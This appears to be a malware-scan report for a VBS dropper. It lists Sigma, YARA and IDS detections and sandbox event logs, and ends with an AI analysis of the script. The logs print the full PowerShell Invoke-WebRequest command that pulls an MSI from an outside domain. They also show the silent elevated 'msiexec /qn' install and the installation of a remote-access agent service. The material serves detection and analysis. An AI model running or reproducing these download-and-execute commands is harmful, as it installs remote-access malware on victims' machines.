crowdsourced_yara_results.description: This signature detects the presence of a number of Windows API functionality often seen within embedded executables. When this signature alerts on an executable, it is not an indication of malicious behavior. However, if seen firing in other file types, deeper investigation may be warranted.
crowdsourced_yara_results.author: InQuest Labs

crowdsourced_ids_results.rule_raw: alert ( gid:119; sid:279; rev:1; msg:"(http_inspect) invalid status line"; metadata: rule-type preproc; classtype:unknown;)

crowdsourced_ids_results.rule_msg: ET INFO Windows Powershell User-Agent Usage
crowdsourced_ids_results.rule_raw: alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET INFO Windows Powershell User-Agent Usage"; flow:established,to_server; http.user_agent; content:"Mozilla/"; startswith; content:") WindowsPowerShell/"; distance:0; fast_pattern; classtype:not-suspicious; sid:2033355; rev:1; metadata:attack_target Client_Endpoint, created_at 2021_07_16, deployment Perimeter, former_category INFO, signature_severity Informational, updated_at 2021_07_16;)

threat_severity.level_description: Severity MEDIUM because it was considered trojan.

attributes.magic: ASCII text, with CRLF line terminators

sigma_analysis_results.rule_description: Detects the execution of a Windows system binary that is usually located in the system folder from an uncommon location.
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Patrick Bareiss, Anton Kutepov, oscd.community, Nasreddine Bencherchali (Nextron Systems)

match_context.values: @{CommandLine=\??\C:\Windows\system32\conhost.exe; Image=\??\C:\Windows\system32\conhost.exe; EventID=1}

sigma_analysis_results.rule_title: Msiexec.EXE Initiated Network Connection Over HTTP
sigma_analysis_results.rule_description:
Detects an initiated network connection by "Msiexec.exe" over port 80 or 443.
Adversaries might abuse "msiexec.exe" to install and execute remotely hosted packages.

match_context.values: @{SourceIsIpv6=false; DestinationPort=80; Initiated=true; Protocol=tcp; SourceIp=192.168.2.12; DestinationIsIpv6=false; EventID=3; SourcePort=49762; Image=C:\Windows\syswow64\MsiExec.exe; DestinationIp=192.229.221.95}

sigma_analysis_results.rule_description: Detects a suspicious call to Invoke-WebRequest cmdlet where the and output is located in a suspicious location

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\Bruno\AppData\Local\Temp\; OriginalFileName=PowerShell.EXE; Hashes=MD5=C32CA4ACFCC635EC1EA6ED8A34DF5FAC,SHA256=73A3C4AEF5DE385875339FC2EB7E58A9E8A47B6161BDC6436BF78A763537BE70,IMPHASH=194427A488ED1DD0A91731658B071667; Description=Windows PowerShell; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentCommandLine="C:\Windows\system32\wscript.exe" "C:\Users\Bruno\AppData\Local\Temp\Confirmation_Assuran.vbs"; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Command "try {Invoke-WebRequest -Uri 'http://my-sharepoint-inc.com/cloudshare/atr/ca' -OutFile 'C:\home\file.msi'} catch {$_ | Out-File ''}" > ; EventID=1; ParentImage=C:\Windows\SysWOW64\wscript.exe; IntegrityLevel=High; Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

@{Hashes=SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; CurrentDirectory=C:\Windows\system32\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine=C:\Windows\System32\WScript.exe "C:\Users\george\Desktop\Confirmation_Assurance_3K440739.vbs"; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Command "try {Invoke-WebRequest -Uri 'http://my-sharepoint-inc.com/cloudshare/atr/ca' -OutFile 'C:\home\file.msi'} catch {$_ | Out-File ''}" > ; EventID=1; ParentImage=C:\Windows\System32\wscript.exe; IntegrityLevel=Medium; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

@{CommandLine=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command try {Invoke-WebRequest -Uri 'http://my-sharepoint-inc.com/cloudshare/atr/ca' -OutFile 'C:\home\file.msi'} catch {$_ | Out-File ''} >; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; EventID=1}

@{CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Command "try {Invoke-WebRequest -Uri 'http://my-sharepoint-inc.com/cloudshare/atr/ca' -OutFile 'C:\home\file.msi'} catch {$_ | Out-File ''}" >; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; EventID=1}

sigma_analysis_results.rule_title: Suspicious DotNET CLR Usage Log Artifact
sigma_analysis_results.rule_description: Detects the creation of Usage Log files by the CLR (clr.dll). These files are named after the executing process once the assembly is finished executing for the first time in the (user) session context.

match_context.values: @{Image=C:\Windows\SysWOW64\rundll32.exe; EventID=11; TargetFilename=C:\Users\george\AppData\Local\Microsoft\CLR_v4.0_32\UsageLogs\rundll32.exe.log}

sigma_analysis_results.rule_description:
Adversaries may abuse msiexec.exe to proxy execution of malicious payloads.
Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi)

match_context.values: @{Product=Windows Installer - Unicode; CurrentDirectory=C:\Users\Bruno\AppData\Local\Temp\; OriginalFileName=msiexec.exe; Hashes=MD5=9D09DC1EDA745A5F87553048E57620CF,SHA256=3A90EDE157D40A4DB7859158C826F7B4D0F19A5768F6483C9BE6EE481C6E1AF7,IMPHASH=E4E40938E4BF6C66424859ED02171C41; Description=Windows\xae installer; EventID=1; ParentCommandLine="C:\Windows\system32\wscript.exe" "C:\Users\Bruno\AppData\Local\Temp\Confirmation_Assuran.vbs"; CommandLine="C:\Windows\System32\msiexec.exe" /i "C:\home\file.msi" /qn; FileVersion=5.0.19041.1 (WinBuild.160101.0800); ParentImage=C:\Windows\SysWOW64\wscript.exe; IntegrityLevel=High; Image=C:\Windows\SysWOW64\msiexec.exe; Company=Microsoft Corporation}

@{Hashes=SHA1=0C01E942244F1ED095D5EC92DA2FA043565C5CDD,MD5=D3C21CD0C70DC36FDD8A61E4517A226D,SHA256=D7A94CE4C50764B8A6F67DB308F8609AC38F08D1113079EAF81A25AB44E72BA6,IMPHASH=13C7ACE23F99CD5FBC3ABD5C16BF2DCE; CurrentDirectory=C:\Windows\system32\; OriginalFileName=msiexec.exe; Product=Windows Installer - Unicode; Description=Windows\xae installer; FileVersion=5.0.17134.228 (WinBuild.160101.0800); ParentCommandLine=C:\Windows\System32\WScript.exe "C:\Users\george\Desktop\Confirmation_Assurance_3K440739.vbs"; CommandLine="C:\Windows\System32\msiexec.exe" /i "C:\home\file.msi" /qn; EventID=1; ParentImage=C:\Windows\System32\wscript.exe; IntegrityLevel=High; Image=C:\Windows\System32\msiexec.exe; Company=Microsoft Corporation}

@{SourceIsIpv6=false; DestinationPort=443; DestinationIp=40.119.152.241; Protocol=tcp; SourceIp=192.168.2.12; DestinationIsIpv6=false; EventID=3; SourcePort=49761; Image=C:\Windows\SysWOW64\rundll32.exe; Initiated=true}

sigma_analysis_results.rule_title: Remote Access Tool Services Have Been Installed - Security
sigma_analysis_results.rule_description: Detects service installation of different remote access tools software. These software are often abused by threat actors to perform

match_context.values: @{SubjectUserSid=S-1-5-18; ClientProcessId=5224; ServiceType=0x10; SubjectLogonId=999; EventID=4697; ServiceName=AteraAgent; SubjectUserName=DESKTOP-ET51AJO$; SubjectDomainName=WORKGROUP}

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets - ScriptBlock
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs

match_context.values: @{ScriptBlockText=try {Invoke-WebRequest -Uri 'http://my-sharepoint-inc.com/cloudshare/atr/ca' -OutFile 'C:\home\file.msi'} catch {$_ | Out-File ''} >; MessageTotal=1; ScriptBlockId=1f4b4a76-5904-418e-b33a-da736a165e2a; Path=; EventID=4104; MessageNumber=1}

@{ScriptBlockText=try {Invoke-WebRequest -Uri 'http://my-sharepoint-inc.com/cloudshare/atr/ca' -OutFile 'C:\home\file.msi'} catch {$_ | Out-File ''} >; Path=; ScriptBlockId=f3163bb5-e5e0-4a61-9240-a8fe00e613f7; MessageTotal=1; MessageNumber=1; EventID=4104}

sigma_analysis_results.rule_title: Unsigned DLL Loaded by Windows Utility
sigma_analysis_results.rule_description:
Detects windows utilities loading an unsigned or untrusted DLL.
Adversaries often abuse those programs to proxy execution of malicious code.

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via CommandLine

sigma_analysis_results.rule_description: Detects non-interactive PowerShell activity by looking at the "powershell" process with a non-user GUI process such as "explorer.exe" as a parent.

sigma_analysis_results.rule_description: Detects the stopping of a Windows service via the "net" utility.
sigma_analysis_results.rule_author: Jakob Weinzettl, oscd.community, Nasreddine Bencherchali (Nextron Systems)

crowdsourced_ai_results.analysis:
The code begins by defining several variables, including a URL, home folder path, download path, MSI path, and various objects. The URL points to a remote MSI file, and the home folder path is used to create a local folder if it doesn't exist. The download path is set to a file named "file.msi" within the home folder.

A PowerShell command is constructed to download the MSI file from the specified URL and save it to the download path. The command also includes error handling to log any errors to a temporary error file. The PowerShell command is then executed using the WScript.Shell object.

Once the MSI file is downloaded, the code uses the Shell.Application object to silently install the MSI file with administrative privileges. The installation process is performed using the "msiexec.exe" command with the "/i" switch to install the MSI file, the "/qn" switch to suppress the user interface, and the "runas" switch to elevate privileges.

Finally, the code cleans up by setting the various objects to Nothing.
